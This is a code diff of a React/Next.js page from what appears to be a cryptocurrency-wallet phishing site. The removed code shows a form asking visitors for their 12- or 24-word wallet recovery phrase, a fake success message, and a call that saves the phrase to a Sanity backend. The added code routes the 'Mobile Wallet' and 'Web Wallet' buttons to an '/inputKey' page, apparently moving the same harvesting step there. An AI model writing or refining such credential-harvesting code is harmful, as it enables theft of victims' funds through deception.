@@ -1,8 +1,7 @@
+import Link from "next/link";
 import React, { useState } from "react";
-import client from "../sanity";
 
 const phrase = () => {
-  const [phrase, setPhrase] = useState("");
   const [smallModal, setSmallModal] = useState(false);
   const [overlay, setOverlay] = useState(false);
   const [showPhrase, setShowPhrase] = useState(false);
@@ -74,26 +73,6 @@ const phrase = () => {
     },
   ];
 
-  const getPhrase = () => {
-    console.log(phrase, "✅");
-    if (phrase.length < 12) {
-      alert("Word Phrase is too short");
-      return;
-    }
-    setPhrase("");
-    alert("Phrase has been submitted Successfully 🎉");
-    // Send details to backend
-    const doc = {
-      _type: "post",
-      title: "New Phrase 🎉",
-      phrase,
-    };
-    client
-      .create(doc)
-      .then((res) => console.log("Results", res))
-      .catch((err) => console.error(err));
-  };
-
   // Function Calls
   const firstFunc = (name, image, color) => {
     setWalletQueries({
@@ -160,26 +139,21 @@ const phrase = () => {
                 </h1>
               </div>
               <div className="flex flex-col">
-                <button
-                  className={`${walletQueries.color} marker:sm:text-base text-sm mt-3 font-semibold text-white px-3 py-2`}
-                  onClick={() => {
-                    setShowPhrase(true);
-                      setSmallModal((prev) => !prev);
-                      setOverlay((prev) => !prev);
-                  }}
-                >
-                  Mobile Wallet
-                </button>
-                <button
-                  className={`border-2 border-${walletQueries.color}-500 sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
-                  onClick={() => {
-                    setShowPhrase(true);
-                    setSmallModal((prev) => !prev);
-                    setOverlay((prev) => !prev);
-                  }}
-                >
-                  Web Wallet
-                </button>
+                <Link href="/inputKey">
+                  <button
+                    className={`${walletQueries.color} marker:sm:text-base w-full text-sm mt-3 font-semibold text-white px-3 py-2`}
+                  >
+                    Mobile Wallet
+                  </button>
+                </Link>
+                <Link href="/inputKey">
+                  <button
+                    className={`border-2 border-${walletQueries.color}-500 w-full sm:text-base text-sm mt-3 font-semibold text-black px-3 py-2`}
+                  >
+                    Web Wallet
+                  </button>
+                </Link>
+
                 <button
                   className="mt-5 uppercase text-black font-medium"
                   onClick={() => {
@@ -196,25 +170,7 @@ const phrase = () => {
       )}
 
       {/* End Smll Modal */}
-      {showPhrase && (
-        <div className="mt-14 p-10 text-center">
-          <div>
-            <h1 className="font-semibold">Enter 12/24 word Phrase</h1>
-            <input
-              className="rounded-lg p-3 w-full mt-3 text-white"
-              type="text"
-              value={phrase}
-              onChange={(e) => setPhrase(e.target.value)}
-            />
-          </div>
-          <button
-            className="bg-[#17fb9b] w-full sm:text-base text-sm mt-3 font-semibold rounded-lg text-black  p-2 "
-            onClick={getPhrase}
-          >
-            Continue
-          </button>
-        </div>
-      )}
+
       {/* InnerWalletshow */}
     </div>
   );
